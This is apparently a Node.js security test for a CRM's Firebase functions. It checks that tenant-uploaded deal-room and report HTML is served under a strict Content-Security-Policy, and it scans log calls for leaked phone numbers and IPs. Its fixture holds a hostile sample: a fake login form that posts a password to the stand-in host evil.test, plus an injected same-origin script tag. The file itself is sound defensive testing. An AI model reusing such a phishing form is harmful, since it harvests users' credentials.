/**
 * tests/security-batch-2026-10-03.test.js
 *
 * Two items of the 2026-10-03 security batch that have no other test home
 * (reply hijack: inbound-sms-route + sms-send-optout-order; sendEmail:
 * email-unsubscribe; rules: firestore-rules §46):
 *
 * A. Tenant-authored HTML served on the MAIN domain:
 *   - /deal/<token>   getDealRoom      (functions/deal-acceptance.js) — the
 *     deal-room HTML the rep's client uploads to Storage;
 *   - /report/<token> getSharedReport  (functions/report-sharing.js) — the
 *     report HTML the rep's client saves on reports/{id}.
 * The site-wide Hosting CSP bars inline script, but still allows every
 * same-origin script and form posts anywhere, so a crafted page could load the
 * CRM's own JS on our origin or post a fake login form off-site. Each response
 * now carries its own CSP on top:
 *   - the deal room needs deal-room.js + a same-origin POST, so it gets an
 *     exact-path script allowlist, connect-src 'self', form-action 'none';
 *   - reports are static, so they are served `sandbox`ed (no scripts at all).
 *
 * Drives the REAL exported handlers with firebase stubbed at the module loader
 * (the sms-send-optout-order.test.js idiom) and parses the header it sets.
 *
 * B. PII in logs: the incomingSMS candidate-cap warning logged the sender's
 * full phone number, the public-lead honeypot logged the raw client IP. The
 * log calls are scanned (comments stripped) and the masking helper's output
 * is checked; a positive control proves the scanner flags the old lines.
 *
 * Pure Node. Run: node tests/tenant-html-csp-2026-10-03.test.js
 */
'use strict';

const path = require('path');
const Module = require('module');

let passed = 0, failed = 0; const fails = [];
function ok(name, cond, detail) {
  if (cond) { passed++; console.log('  ✓ ' + name); }
  else { failed++; fails.push(name); console.log('  ✗ ' + name + (detail ? ' — ' + detail : '')); }
}

const FUNCTIONS = path.join(__dirname, '..', 'functions');
const TOKEN = 'a'.repeat(32);
const TENANT_HTML = '<!doctype html><html><head><title>x</title></head><body>'
  + '<form action="https://evil.test/collect"><input name="password"></form>'
  + '<script src="/pro/js/dashboard-bootstrap.module.js"></script></body></html>';

let stubs = null;
const realLoad = Module._load;
Module._load = function (request) {
  if (stubs && Object.prototype.hasOwnProperty.call(stubs, request)) return stubs[request];
  return realLoad.apply(this, arguments);
};

function makeStubs(docs) {
  const docRef = (p) => ({
    get: async () => ({ exists: docs[p] != null, data: () => docs[p], get: (k) => (docs[p] || {})[k] }),
    update: async () => {},
    set: async () => {},
  });
  const db = { doc: docRef, collection: (n) => ({ doc: (id) => docRef(n + '/' + id) }) };
  const noop = () => {};
  return {
    'firebase-functions/v2/https': {
      onRequest: (o, h) => ({ __handler: h }),
      onCall: (o, h) => ({ __handler: h }),
      HttpsError: class extends Error {},
    },
    'firebase-functions/v2': { logger: { info: noop, warn: noop, error: noop } },
    'firebase-functions/params': { defineSecret: (n) => ({ name: n, value: () => '' }) },
    'firebase-admin/firestore': {
      getFirestore: () => db,
      FieldValue: { serverTimestamp: () => 'ts', increment: (n) => n },
      Timestamp: { fromMillis: (ms) => ({ toMillis: () => ms }) },
    },
    'firebase-admin/storage': {
      getStorage: () => ({ bucket: () => ({ file: () => ({ download: async () => [Buffer.from(TENANT_HTML)] }) }) }),
    },
    './integrations/upstash-ratelimit': { httpRateLimit: async () => true },
    './integrations/_shared': { secretOr: (s, d) => d },
    './shared': { callableRateLimit: async () => {}, assertNotViewer: noop },
    './deal-install-date': { fillLeadInstallDate: async () => {} },
    './push-functions': {},
  };
}

function mkRes() {
  const r = { statusCode: 200, headers: {}, body: undefined };
  r.set = (k, v) => { r.headers[k.toLowerCase()] = v; return r; };
  r.status = (c) => { r.statusCode = c; return r; };
  r.send = (b) => { r.body = b; return r; };
  r.json = (b) => { r.body = b; return r; };
  r.end = () => r;
  return r;
}

function load(file, docs) {
  stubs = makeStubs(docs);
  delete require.cache[path.join(FUNCTIONS, file)];
  return require(path.join(FUNCTIONS, file));
}

function parseCsp(v) {
  const out = {};
  String(v || '').split(';').map((s) => s.trim()).filter(Boolean).forEach((d) => {
    const [name, ...vals] = d.split(/\s+/);
    out[name.toLowerCase()] = vals;
  });
  return out;
}

(async () => {
  console.log('A. getDealRoom — /deal/<token> (tenant-uploaded deal-room HTML)');
  {
    const mod = load('deal-acceptance.js', {
      ['deal_accept_tokens/' + TOKEN]: { status: 'pending', dealId: 'd1', htmlPath: 'deal_rooms/u/d1.html', expiresAt: { toMillis: () => Date.now() + 1e6 } },
      'deal_rooms/d1': { status: 'sent' },
    });
    const res = mkRes();
    await mod.getDealRoom.__handler({ path: '/deal/' + TOKEN, get: () => 'Mozilla/5.0 (iPhone)', headers: {} }, res);
    ok('serves the page (control)', res.statusCode === 200 && /evil\.test/.test(String(res.body)), String(res.statusCode));
    const csp = parseCsp(res.headers['content-security-policy']);
    ok('sets a Content-Security-Policy', !!res.headers['content-security-policy'], JSON.stringify(res.headers));
    ok("form-action 'none' (a fake login form cannot post anywhere)", (csp['form-action'] || []).join(' ') === "'none'");
    ok("frame-ancestors 'none' and base-uri 'none'",
      (csp['frame-ancestors'] || []).join(' ') === "'none'" && (csp['base-uri'] || []).join(' ') === "'none'");
    const scripts = (csp['script-src'] || []).concat(csp['script-src-elem'] || []);
    ok("script-src is NOT 'self' / a host wildcard — only deal-room.js by exact path",
      scripts.length > 0 && scripts.every((s) => /^https:\/\/[a-z.-]+\/pro\/deal-room\.js$/.test(s)), scripts.join(' '));
    ok("inline script stays barred (no 'unsafe-inline' in script-src)", !scripts.includes("'unsafe-inline'"));
    ok("connect-src 'self' only (the same-origin ACCEPT POST still works)", (csp['connect-src'] || []).join(' ') === "'self'");
    // 2026-10-06 (R3-4 deal-room note): sandboxed now, but ALWAYS with
    // allow-same-origin — an opaque origin would break the same-origin ACCEPT
    // POST. tests/report-link-pdf-only-2026-10-06.test.js pins the rest.
    ok('sandbox keeps the real origin (allow-same-origin + allow-scripts) so the ACCEPT POST still works',
      'sandbox' in csp && csp.sandbox.includes('allow-same-origin') && csp.sandbox.includes('allow-scripts'),
      (csp.sandbox || []).join(' '));
    ok("default-src 'none'", (csp['default-src'] || []).join(' ') === "'none'");
  }

  console.log("getSharedReport — /report/<token> (tenant-saved report HTML)");
  {
    const mod = load('report-sharing.js', {
      ['report_share_tokens/' + TOKEN]: { status: 'active', reportId: 'r1' },
      'reports/r1': { html: TENANT_HTML },
    });
    const res = mkRes();
    await mod.getSharedReport.__handler({ path: '/report/' + TOKEN, get: () => '', headers: {} }, res);
    ok('serves the report (control)', res.statusCode === 200 && /evil\.test/.test(String(res.body)), String(res.statusCode));
    const raw = res.headers['content-security-policy'];
    const csp = parseCsp(raw);
    ok('sets a Content-Security-Policy', !!raw, JSON.stringify(res.headers));
    ok('sandboxed with NO allow-* tokens (no scripts, forms, popups, same-origin)',
      'sandbox' in csp && csp.sandbox.length === 0, raw);
    ok("form-action 'none', frame-ancestors 'none', base-uri 'none'",
      (csp['form-action'] || []).join(' ') === "'none'"
      && (csp['frame-ancestors'] || []).join(' ') === "'none'"
      && (csp['base-uri'] || []).join(' ') === "'none'");
    ok("default-src 'none' and no script-src at all", (csp['default-src'] || []).join(' ') === "'none'" && !('script-src' in csp));
    ok('images still load (img-src allows https: and data:)', (csp['img-src'] || []).includes('https:') && (csp['img-src'] || []).includes('data:'));
  }

  stubs = null;
  Module._load = realLoad;

  console.log('B. PII in logs');
  {
    const fs = require('fs');
    const read = (f) => fs.readFileSync(path.join(FUNCTIONS, f), 'utf8');
    const strip = (s) => s.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:'"])\/\/.*$/gm, '$1');
    // Every logger.<level>(…) call's argument text (calls fit on a line or a
    // few; take up to the closing `);`).
    const loggerCalls = (src) => {
      const out = [];
      const re = /logger\.(?:info|warn|error|debug|log)\(/g;
      let m;
      while ((m = re.exec(src))) {
        const end = src.indexOf(');', m.index);
        out.push(src.slice(m.index, end === -1 ? m.index + 400 : end + 2));
      }
      return out;
    };
    // A homeowner's raw phone (fromDigits / fromPhone / phoneDigits passed as
    // a value) inside a log call. (incomingSMS's forged-signature warning keeps
    // the CALLER's IP on purpose — that is an attacker, not a customer.)
    const phoneLeak = (call) => /[{,]\s*(fromDigits|fromPhone|phoneDigits)\s*[},]/.test(call)
      || /:\s*(fromDigits|fromPhone)\b(?!\s*\))/.test(call);
    // A public-form visitor's raw IP (clientIp(req) as a value).
    const ipLeak = (call) => /\bip\s*:\s*clientIp\(/.test(call);

    // Positive control: the exact pre-fix lines are flagged.
    ok('scanner flags the pre-fix phone log (positive control)',
      phoneLeak("logger.warn('[incomingSMS] candidate cap hit — match set may be incomplete', { fromDigits });"));
    ok('scanner flags the pre-fix honeypot IP log (positive control)',
      ipLeak("logger.info('submitPublicLead: honeypot tripped', { kind, key: hpKey, ip: clientIp(req) });"));

    const sms = loggerCalls(strip(read('sms-functions.js'))).filter(phoneLeak);
    ok('sms-functions.js: no log call carries a raw sender phone', sms.length === 0, sms.join(' | '));
    const integ = loggerCalls(strip(read('handlers/integrations.js'))).filter(ipLeak);
    ok('handlers/integrations.js: no log call carries a raw client IP', integ.length === 0, integ.join(' | '));

    // The masking helper itself, run (not pattern-matched).
    const src = read('sms-functions.js');
    const start = src.indexOf('function maskPhoneLast2(');
    ok('sms-functions.js defines maskPhoneLast2', start !== -1);
    if (start !== -1) {
      const body = src.slice(start, src.indexOf('\n}', start) + 2);
      const mask = require('vm').runInNewContext('(' + body + ')');
      ok('maskPhoneLast2 keeps only the last 2 digits',
        mask('+18595550134') === '…34' && mask('(859) 555-0134') === '…34' && mask('') === '' && mask(null) === '',
        [mask('+18595550134'), mask('')].join(','));
    }
  }

  console.log('\n──────────────────────────────────────────────────');
  console.log(`${passed} passed, ${failed} failed`);
  if (failed) {
    console.log('\nFailures:');
    fails.forEach((f) => console.log('  - ' + f));
    process.exit(1);
  }
})().catch((e) => {
  console.error('suite crashed:', e && e.stack || e);
  process.exit(1);
});
